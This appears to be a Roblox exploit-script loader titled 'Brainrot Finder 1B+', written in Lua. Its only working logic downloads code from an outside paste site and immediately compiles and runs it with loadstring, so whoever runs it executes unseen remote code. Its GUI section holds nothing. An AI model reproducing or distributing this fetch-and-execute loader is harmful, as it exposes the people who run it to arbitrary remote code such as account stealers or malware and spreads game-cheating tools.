--// BRAINROT FINDER 1B+ LOADER

local URL = "https://oblivionhub.xyz/api/paste?id=42425b5f305561169862cf2e9cdc7a38&raw=true"

--// LOADER FUNCTION
local function ExecuteLoader()
    local source = game:HttpGet(URL)

    assert(
        type(source) == "string" and #source > 0,
        "Loader returned empty content"
    )

    local compiled, compileError = loadstring(source)

    assert(
        compiled,
        compileError or "Compilation failed"
    )

    compiled()
end

--// GUI SETUP
